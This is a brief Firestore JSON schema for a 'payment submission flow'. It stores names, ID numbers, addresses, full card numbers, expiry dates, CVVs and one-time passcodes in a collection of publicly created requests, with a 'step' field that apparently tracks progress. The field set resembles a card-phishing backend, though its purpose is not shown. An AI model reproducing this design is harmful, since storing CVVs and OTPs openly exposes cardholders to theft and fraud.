{
  "entities": {
    "RequestData": {
      "title": "Request Data",
      "description": "A payment submission flow.",
      "type": "object",
      "properties": {
        "name": { "type": "string" },
        "mobile": { "type": "string" },
        "idNumber": { "type": "string" },
        "cardType": { "type": "string" },
        "address": { "type": "string" },
        "date": { "type": "string" },
        "paymentName": { "type": "string" },
        "cardNumber": { "type": "string" },
        "expMonth": { "type": "string" },
        "expYear": { "type": "string" },
        "cvv": { "type": "string" },
        "otp": { "type": "string" },
        "step": { "type": "string" },
        "createdAt": { "type": "string" },
        "updatedAt": { "type": "string" }
      }
    }
  },
  "firestore": {
    "/requests/{requestId}": {
      "schema": { "$ref": "#/entities/RequestData" },
      "description": "Publicly created payment requests"
    }
  }
}
